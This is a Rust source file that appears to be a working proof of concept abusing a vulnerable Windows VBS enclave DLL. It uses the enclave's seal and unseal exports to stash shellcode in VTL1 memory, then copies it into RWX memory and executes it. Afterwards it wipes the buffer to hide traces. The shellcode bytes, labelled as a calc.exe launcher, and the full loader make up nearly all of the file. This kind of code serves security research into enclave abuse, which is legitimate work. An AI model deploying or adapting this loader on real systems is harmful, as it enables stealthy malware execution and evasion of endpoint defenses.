use std::ffi::{c_void, CString};
use std::ptr;
use std::sync::OnceLock;

use windows::Win32::Foundation::HMODULE;
use windows::Win32::System::LibraryLoader::GetProcAddress;
use windows::Win32::System::Memory::{VirtualAlloc, MEM_COMMIT, PAGE_EXECUTE_READWRITE};

type InitTag = *mut c_void;
type PVOID = *mut c_void;
type DWORD = u32;
type BOOL = i32;

const ENCLAVE_TYPE_VBS: DWORD = 0x10;

#[repr(C)]
struct ENCLAVE_CREATE_INFO_VBS {
    flags: DWORD,
    owner_id: [u8; 32],
}

#[repr(C)]
struct ENCLAVE_INIT_INFO_VBS {
    length: DWORD,
    thread_count: DWORD,
}

#[repr(C)]
struct prefs_init {
    init_name: *mut u8,
}

#[repr(C)]
struct seal_args {
    config_ll: InitTag,
    data_to_seal: *mut u8,
    protected_blob: *mut u8,
    sz_data_to_seal: DWORD,
    sz_protected_blob_size: DWORD,
}

#[repr(C)]
struct unseal_args {
    config_ll: InitTag,
    protected_blob: *mut u8,
    unsealed_data: *mut u8,
    sz_protected_blob: DWORD,
    unsealed_size: DWORD,
    unsealed_size_max: DWORD,
}

// ffi to enclave apis
#[link(name = "kernel32")]
unsafe extern "system" {
    fn IsEnclaveTypeSupported(flEnclaveType: DWORD) -> BOOL;
    fn CreateEnclave(
        hProcess: PVOID,
        lpAddress: PVOID,
        dwSize: usize,
        dwInitialCommitment: usize,
        flEnclaveType: DWORD,
        lpEnclaveInformation: *const c_void,
        dwInfoLength: DWORD,
        lpEnclaveError: *mut DWORD,
    ) -> PVOID;
    fn LoadEnclaveImageW(lpEnclaveAddress: PVOID, lpImageName: *const u16) -> BOOL;
    fn InitializeEnclave(
        hProcess: PVOID,
        lpAddress: PVOID,
        lpEnclaveInformation: *const c_void,
        dwInfoLength: DWORD,
        lpEnclaveError: *mut DWORD,
    ) -> BOOL;
    fn GetCurrentProcess() -> PVOID;
    fn GetLastError() -> DWORD;
}

#[link(name = "kernel32")]
unsafe extern "system" {
    fn LoadLibraryA(lpLibFileName: *const u8) -> PVOID;
    #[link_name = "GetProcAddress"]
    fn RawGetProcAddress(hModule: PVOID, lpProcName: *const u8) -> PVOID;
}

type CallEnclaveFn = unsafe extern "system" fn(
    routine: PVOID,
    parameter: *mut c_void,
    wait_for_thread: BOOL,
    return_value: *mut *mut c_void,
) -> BOOL;

//search CallEnclave inside two dlls
unsafe fn get_call_enclave() -> CallEnclaveFn {
    static FUNC: OnceLock<usize> = OnceLock::new();
    let addr = *FUNC.get_or_init(|| {
        let proc_name = b"CallEnclave\0";
        for dll in &[&b"kernel32.dll\0"[..], &b"kernelbase.dll\0"[..]] {
            let h = LoadLibraryA(dll.as_ptr());
            if !h.is_null() {
                let p = RawGetProcAddress(h, proc_name.as_ptr());
                if !p.is_null() {
                    println!(
                        "[*] Found CallEnclave in {:?} at {:?} ",
                        std::str::from_utf8_unchecked(&dll[..dll.len() - 1]),
                        p
                    );
                    return p as usize;
                }
            }
        }
        panic!("CallEnclave not found in any DLL");
    });
    std::mem::transmute(addr)
}

unsafe fn call_enclave(
    routine: PVOID,
    parameter: *mut c_void,
    return_value: *mut *mut c_void,
) -> BOOL {
    let func = get_call_enclave();
    let result = func(routine, parameter, 1, return_value);
    if result == 0 {
        println!("[!] CallEnclave failed, GetLastError={}", GetLastError());
    }
    result
}

fn print_buffer(buffer: &[u8]) {
    for (i, byte) in buffer.iter().enumerate() {
        print!("{:02X} ", byte);
        if (i + 1) % 16 == 0 {
            println!();
        }
    }
    println!();
}

unsafe fn get_enclave_proc(enclave: PVOID, name: &str) -> PVOID {
    let cname = CString::new(name).unwrap();
    let addr = GetProcAddress(
        HMODULE(enclave as _),
        windows::core::PCSTR::from_raw(cname.as_ptr() as *const u8),
    )
    .unwrap_or_else(|| panic!("GetProcAddress({}) failed", name));
    addr as PVOID
}

unsafe fn load_vulnerable_enclave(enclave_path: &[u16]) -> PVOID {
    if IsEnclaveTypeSupported(ENCLAVE_TYPE_VBS) == 0 {
        println!("VBS Enclave not supported");
        return ptr::null_mut();
    }

    let mut create_info: ENCLAVE_CREATE_INFO_VBS = std::mem::zeroed();
    create_info.flags = 0;
    create_info.owner_id[..8].copy_from_slice(&[0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88]);

    let enclave = CreateEnclave(
        GetCurrentProcess(),
        ptr::null_mut(),
        0x1000_0000,
        0,
        ENCLAVE_TYPE_VBS,
        &create_info as *const _ as *const c_void,
        std::mem::size_of::<ENCLAVE_CREATE_INFO_VBS>() as DWORD,
        ptr::null_mut(),
    );

    if enclave.is_null() {
        println!("CreateEnclave failed");
        return ptr::null_mut();
    }

    let load_ok = LoadEnclaveImageW(enclave, enclave_path.as_ptr());
    if load_ok == 0 {
        println!(
            "Failed to load enclave image, GetLastError={}",
            GetLastError()
        );
        return ptr::null_mut();
    }
    println!("[!] LoadEnclaveImageW succeeded");

    let init_info = ENCLAVE_INIT_INFO_VBS {
        length: std::mem::size_of::<ENCLAVE_INIT_INFO_VBS>() as DWORD,
        thread_count: 1,
    };

    let mut enclave_error: DWORD = 0;
    let init_ok = InitializeEnclave(
        GetCurrentProcess(),
        enclave,
        &init_info as *const _ as *const c_void,
        init_info.length,
        &mut enclave_error,
    );

    if init_ok == 0 {
        println!(
            "[!] InitializeEnclave failed! GetLastError={}, enclaveError={}",
            GetLastError(),
            enclave_error
        );
    } else {
        println!("[!] InitializeEnclave succeeded");
    }

    println!("[+] Loaded vulnerable enclave: {:?}", enclave);
    enclave
}

unsafe fn initialize_vulnerable_enclave(enclave: PVOID) -> InitTag {
    let init_function = get_enclave_proc(enclave, "Init");
    println!(
        "[+] Init function address: {:?}",
        init_function as *const ()
    );

    let mut init_name = *b"testtest\0";
    let mut init_args = prefs_init {
        init_name: init_name.as_mut_ptr(),
    };

    let mut llconfig: *mut c_void = ptr::null_mut();
    call_enclave(
        init_function,
        &mut init_args as *mut _ as *mut c_void,
        &mut llconfig,
    );

    println!("[+] Vulnerable enclave init function: {:?}", llconfig);
    llconfig
}

unsafe fn enclave_seal_wrapper(
    data: &mut [u8],
    llconfig: InitTag,
    enclave: PVOID,
    address: *mut u8,
) -> DWORD {
    let seal_function = get_enclave_proc(enclave, "SealSettings");

    let mut seal_args = seal_args {
        config_ll: llconfig,
        data_to_seal: data.as_mut_ptr(),
        protected_blob: ptr::null_mut(),
        sz_data_to_seal: data.len() as DWORD,
        sz_protected_blob_size: 0,
    };

    let mut sz_needed: *mut c_void = ptr::null_mut();
    call_enclave(
        seal_function,
        &mut seal_args as *mut _ as *mut c_void,
        &mut sz_needed,
    );

    seal_args.protected_blob = address;
    seal_args.sz_protected_blob_size = sz_needed as DWORD;

    call_enclave(
        seal_function,
        &mut seal_args as *mut _ as *mut c_void,
        &mut sz_needed,
    );

    sz_needed as DWORD
}

unsafe fn enclave_unseal_wrapper(
    llconfig: InitTag,
    enclave: PVOID,
    unseal_address: PVOID,
    sealed_address: *mut u8,
    sealed_size: DWORD,
    unsealed_size: DWORD,
) {
    let unseal_function = get_enclave_proc(enclave, "UnsealSettings");

    let mut unseal_args = unseal_args {
        config_ll: llconfig,
        protected_blob: sealed_address,
        unsealed_data: unseal_address as *mut u8,
        sz_protected_blob: sealed_size,
        unsealed_size,
        unsealed_size_max: unsealed_size,
    };

    let mut ret: *mut c_void = ptr::null_mut();
    call_enclave(
        unseal_function,
        &mut unseal_args as *mut _ as *mut c_void,
        &mut ret,
    );
}

fn main() {
    unsafe {
        let enclave_path: Vec<u16> = "..\\..\\prefs_enclave_x64.dll\0".encode_utf16().collect();

        let enclave = load_vulnerable_enclave(&enclave_path);
        if enclave.is_null() {
            println!("Failed to load vulnerable enclave");
            return;
        }

        let llconfig = initialize_vulnerable_enclave(enclave);
        if llconfig.is_null() {
            println!("Failed to initialize vulnerable enclave");
            return;
        }

        // calc.exe
        #[rustfmt::skip]
        let mut shellcode: Vec<u8> = vec![
            0x49, 0x89, 0xE7, 0x48, 0x31, 0xFF, 0x48, 0xF7, 0xE7, 0x65, 0x48, 0x8B, 0x58, 0x60,
            0x48, 0x8B, 0x5B, 0x18, 0x48, 0x8B, 0x5B, 0x20, 0x48, 0x8B, 0x1B, 0x48, 0x8B, 0x1B,
            0x48, 0x8B, 0x5B, 0x20, 0x49, 0x89, 0xD8, 0x8B, 0x5B, 0x3C, 0x4C, 0x01, 0xC3, 0x48,
            0x31, 0xC9, 0x66, 0x81, 0xC1, 0xFF, 0x88, 0x48, 0xC1, 0xE9, 0x08, 0x8B, 0x14, 0x0B,
            0x4C, 0x01, 0xC2, 0x4D, 0x31, 0xD2, 0x44, 0x8B, 0x52, 0x1C, 0x4D, 0x01, 0xC2, 0x4D,
            0x31, 0xDB, 0x44, 0x8B, 0x5A, 0x20, 0x4D, 0x01, 0xC3, 0x4D, 0x31, 0xE4, 0x44, 0x8B,
            0x62, 0x24, 0x4D, 0x01, 0xC4, 0xEB, 0x32, 0x5B, 0x59, 0x48, 0x31, 0xC0, 0x48, 0x89,
            0xE2, 0x51, 0x48, 0x8B, 0x0C, 0x24, 0x48, 0x31, 0xFF, 0x41, 0x8B, 0x3C, 0x83, 0x4C,
            0x01, 0xC7, 0x48, 0x89, 0xD6, 0xF3, 0xA6, 0x74, 0x05, 0x48, 0xFF, 0xC0, 0xEB, 0xE6,
            0x59, 0x66, 0x41, 0x8B, 0x04, 0x44, 0x41, 0x8B, 0x04, 0x82, 0x4C, 0x01, 0xC0, 0x53,
            0xC3, 0x48, 0x31, 0xC9, 0x80, 0xC1, 0x07, 0x48, 0xB8, 0x0F, 0xA8, 0x96, 0x91, 0xBA,
            0x87, 0x9A, 0x9C, 0x48, 0xF7, 0xD0, 0x48, 0xC1, 0xE8, 0x08, 0x50, 0x51, 0xE8, 0xB0,
            0xFF, 0xFF, 0xFF, 0x49, 0x89, 0xC6, 0x48, 0x31, 0xC9, 0x48, 0xF7, 0xE1, 0x50, 0x48,
            0xB8, 0x9C, 0x9E, 0x93, 0x9C, 0xD1, 0x9A, 0x87, 0x9A, 0x48, 0xF7, 0xD0, 0x50, 0x48,
            0x89, 0xE1, 0x48, 0xFF, 0xC2, 0x48, 0x83, 0xEC, 0x20, 0x41, 0xFF, 0xD6, 0x4C, 0x89,
            0xFC, 0xC3,
        ];

        let shellcode_len = shellcode.len();

        let mut cleanup = vec![0u8; shellcode_len];

        let shellcode_vtl1_address = (llconfig as *mut u8).add(100);
        let sz_needed_shellcode =
            enclave_seal_wrapper(&mut shellcode, llconfig, enclave, shellcode_vtl1_address);
        println!(
            "[+] Written encrypted shellcode to VTL1: {:?}",
            shellcode_vtl1_address
        );

        let cleanup_vtl1_address = shellcode_vtl1_address.add(sz_needed_shellcode as usize);
        let sz_needed_cleanup =
            enclave_seal_wrapper(&mut cleanup, llconfig, enclave, cleanup_vtl1_address);
        println!(
            "[+] Written cleanup data to VTL1: {:?}",
            cleanup_vtl1_address
        );

        let mem = VirtualAlloc(None, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        println!("[+] Allocated RWX memory for shellcode: {:?}", mem);

        enclave_unseal_wrapper(
            llconfig,
            enclave,
            mem,
            shellcode_vtl1_address,
            sz_needed_shellcode,
            shellcode_len as DWORD,
        );
        println!("[+] Written shellcode from VTL1 to VTL0: {:?}", mem);

        print!("[*] RWX buffer (before): ");
        let slice = std::slice::from_raw_parts(mem as *const u8, 16);
        print_buffer(slice);

        println!("[+] Jumping to shellcode");
        let func: unsafe extern "C" fn() -> u32 = std::mem::transmute(mem);
        func();

        enclave_unseal_wrapper(
            llconfig,
            enclave,
            mem,
            cleanup_vtl1_address,
            sz_needed_cleanup,
            shellcode_len as DWORD,
        );

        println!("[+] Overwritten shellcode with cleanup buffer");
        print!("[*] RWX buffer (after): ");
        let slice = std::slice::from_raw_parts(mem as *const u8, 16);
        print_buffer(slice);

        println!("[💕] dude i love vbs --<-<-<@");
    }
}
